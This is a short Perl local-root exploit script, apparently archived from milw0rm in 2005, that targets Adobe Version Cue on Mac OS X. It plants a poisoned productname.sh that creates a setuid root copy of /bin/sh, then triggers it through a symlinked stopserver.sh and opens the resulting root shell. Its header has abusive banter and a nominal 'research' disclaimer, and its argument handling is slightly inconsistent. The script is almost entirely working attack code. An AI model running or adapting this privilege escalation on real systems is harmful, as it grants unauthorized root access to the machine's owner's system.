#!/usr/bin/perl -w
#
#####by unl0ck-[0xdeadababe]
#[http://unl0ck.void.ru]
#[http://0xdeadbabe.blackhatz.info]
#-------------------------------------------------
#Only for challenge :) and Researche pruproses.
#####Distribution:
#-------------------------------------------------
#It's a fuck public code , not private.
#Fuck off trade bitchez.
#-------------------------------------------------
#####Appendix:
#-------------------------------------------------
#Mac OS X - Adobe Version Cue local root exploit
#it's a very lame exploit for Adobe Cue.
#-------------------------------------------------
#

if (@ARGV < 1)
 {
 print q(==========
[Mac OS X - Adobe Version Cue local root exploit]
USES: ./un_0wnz_macue.pl /path/to\ /yours/\ Adobe\ Cue/
--- by unl0ck-[0xdeadbabe] ---
==========
 );
 exit;
 }

$path  = $ARGV[1];

print "[~] Your current id is:\n";

system "id";

print "[~] Poisoning productname.sh...\n";

system('echo "cp /bin/sh /Users/$USER;chmod 4755 /Users/$USER/sh;chown root /Users/$USER/sh" > productname.sh') == 0 or die "[-] Not writeble dir.";

print "[~] Setting execute permission to poisoned script...\n";

system("chmod 0755 ./productname.sh") == 0 or die "[-] Productname.sh here not found.";

print "[~] Copy here stopserver.sh script...\n";

system("ln -s $path/stopserver.sh")== 0 or die "Can not copy stopserver.sh from Adobe Cue path.";

print "[~] Running the copyed stopserver.sh...\n";

system("./stopserver.sh")== 0 or die "Can not Run stopserver.sh.";

print "[!] Preloading r00t-shell for you..\n";

system ("./sh")== 0 or die "Can not preload suid-shell";

print '[+] Exploited. See to euid ;):';

print "\n";

system "id";

exit();

# milw0rm.com [2005-02-07]
